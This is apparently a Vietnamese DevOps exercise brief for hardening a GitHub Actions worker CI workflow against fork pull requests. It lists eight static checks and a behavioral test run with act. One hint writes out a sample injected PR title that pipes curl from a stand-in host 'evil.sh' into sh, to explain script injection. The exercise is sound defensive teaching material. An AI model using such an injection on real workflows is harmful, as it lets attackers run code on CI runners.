---
title: Gia cố workflow CI của worker trước khi mở repo cho cộng tác viên ngoài
level: basic
services: []
files:
  - path: starter/.github/workflows/worker-ci.yml
    note: Workflow chạy được nhưng không an toàn; sửa tại chỗ
  - path: tests/test_hardening.py
    note: Không sửa
  - path: tests/fixtures/worker-ci.starter.yml
    note: Bản gốc của starter, test chứng minh phép kiểm bắt được lỗi của nó
  - path: tests/fixtures/repo/requirements-dev.txt
    note: Dependency cho test, ghim phiên bản
run:
  - 'ACT_RUNNER="devops-track/act-runner:1.0-$(cat setup/act-runner/Dockerfile setup/act-runner/requirements-ci.txt | sha256sum | cut -c1-8)" && docker pull node:24.22.2-trixie-slim && docker build --pull=false -t "$ACT_RUNNER" setup/act-runner'
  - uv run pytest tracks/devops/modules/07-cicd-artifacts/exercises/basic/02-workflow-hardening -q
---

## Mục tiêu

Đọc một workflow như kẻ tấn công đọc nó: ai kích hoạt được, chạy code của ai, với token quyền gì, chèn được gì vào shell. Sửa
từng chỗ mà không làm hỏng việc workflow đang làm.

## Đề bài

Olist sắp mở repo Olist Shop cho cộng tác viên ngoài gửi pull request từ fork. Workflow `worker-ci.yml` chạy test của worker
(`tests/test_worker.py`) đang xanh, nhưng security review trả về danh sách lo ngại: workflow chạy được trên PR từ fork với quyền
của repo gốc, token có quyền ghi mọi thứ, action trỏ theo tag có thể bị dời, tiêu đề PR đi thẳng vào shell, job có thể treo 6
giờ, mỗi push lên nhánh nào cũng chạy.

Sửa `starter/.github/workflows/worker-ci.yml` để đạt mọi điểm dưới, giữ job `worker-tests` vẫn chạy test của worker, giữ hai bước
**Cài uv** và **Cài Python và dependency** (giải thích ở Basic 01), giữ bước lưu báo cáo (guard `if: ${{ !env.ACT }}` vì
`actions/upload-artifact` cần dịch vụ artifact của GitHub). Bước ghi chú PR có thể giữ (in an toàn) hoặc bỏ.

Phép kiểm tĩnh (đọc YAML, không cần actionlint):

1. Không có trigger `pull_request_target`; có `pull_request`; `push` giới hạn `branches: [main]`.
2. `permissions:` cấp workflow có mặt và là `{}` hoặc chỉ `contents: read`. Job nào có `permissions:` riêng cũng chỉ được như vậy.
3. Mỗi job có `timeout-minutes` từ 1 tới 30.
4. Mỗi job có `concurrency` (cấp workflow hoặc cấp job) với `group` và `cancel-in-progress` bật.
5. Mọi `uses:` ghim theo commit SHA đủ 40 ký tự hex (`owner/repo@<sha>`), kể cả `actions/checkout`.
6. Mọi bước `actions/checkout` có `with: persist-credentials: false` và không đặt `ref`, `repository` hay input nào ngoài
   danh sách an toàn (`persist-credentials`, `fetch-depth`, `fetch-tags`, `clean`, `lfs`, `submodules`, `show-progress`,
   `filter`, `sparse-checkout`, `sparse-checkout-cone-mode`, `set-safe-directory`, `path`). Checkout mặc định đã lấy đúng commit
   của sự kiện; dưới act, checkout không clone từ remote khi không đặt `ref`/`repository` (đặt thì act tải và chạy action thật,
   `act_run` từ chối).
7. Không bước `run:` nào chứa biểu thức `${{ ... }}` đọc `github.event.*` hay `github.head_ref`; giá trị đó phải đi qua `env:`.
8. Job `worker-tests` giữ bước `actions/upload-artifact` lưu báo cáo test (xoá bước không phải cách sửa), và bước đó có `if: ${{ !cancelled() && !env.ACT }}` (hoặc `always()` thay cho
   `!cancelled()`): báo cáo cần nhất đúng lúc test fail, mà mặc định bước sau một bước lỗi không chạy. `!env.ACT` vẫn giữ để act
   bỏ qua bước này; testkit công nhận hàm trạng thái nối bằng `&&` với `!env.ACT` (mục 3 của lý thuyết).

Phép kiểm hành vi: `testkit.act_run` chạy workflow với sự kiện `push` trên `main` trong image runner `devops-track/act-runner:1.0-<hash8>` (không
socket Docker, bước có guard bị bỏ qua); job `worker-tests` phải xanh và pytest phải in dòng `N passed`. Thêm `actionlint` (nếu đã
cài, chạy với `-shellcheck= -pyflakes=`): không lỗi. actionlint tự bắt điểm 7 với `github.event.pull_request.title`, nên đây là
lưới thứ hai, không phải lưới duy nhất. Một test đưa `tests/fixtures/worker-ci.starter.yml` vào phép kiểm tĩnh và đòi bắt đủ các
lỗi của nó; một test khác thêm `ref: ${{ github.sha }}` cho checkout và guard `always() || !env.ACT` cho bước lưu báo
cáo rồi đòi bị bắt, một test xoá bước lưu báo cáo và đòi bị bắt.

Lấy SHA của một tag action (cần mạng):

```bash
git ls-remote https://github.com/actions/checkout 'refs/tags/v7.0.1' 'refs/tags/v7.0.1^{}'
```

Tag nhẹ in một dòng là commit; tag có chú thích in thêm dòng `^{}`, và SHA của dòng `^{}` mới là commit cần ghim.

## Tiêu chí đạt

- Test tĩnh pass với đủ 8 điểm; test hành vi xanh; actionlint sạch.
- Giải thích được bằng một câu cho từng thay đổi: nó chặn kịch bản tấn công hay sự cố nào.
- Biết `pull_request` từ fork chạy với token chỉ đọc và không có secret, và vì sao đó là điều bạn muốn ở đây.

## Gợi ý

### Gợi ý 1

`pull_request_target` chạy workflow **của nhánh đích** với quyền và secret của repo gốc, kể cả khi PR đến từ fork. Nó an toàn
chỉ khi không bao giờ chạy code của PR. Bước nào `git fetch` rồi `git checkout` code của PR trong workflow đó là trao token ghi
cho người lạ. Workflow này chỉ cần chạy test, nên `pull_request` là đủ.

### Gợi ý 2

Thay `run: echo "${{ github.event.pull_request.title }}"` bằng `env: PR_TITLE: ${{ github.event.pull_request.title }}` rồi
`run: printf '%s\n' "$PR_TITLE"`. Biểu thức `${{ }}` được thay vào **văn bản của script trước khi bash đọc nó**, nên tiêu đề
`"; curl evil.sh | sh; "` thành lệnh; biến môi trường thì bash chỉ coi là dữ liệu.
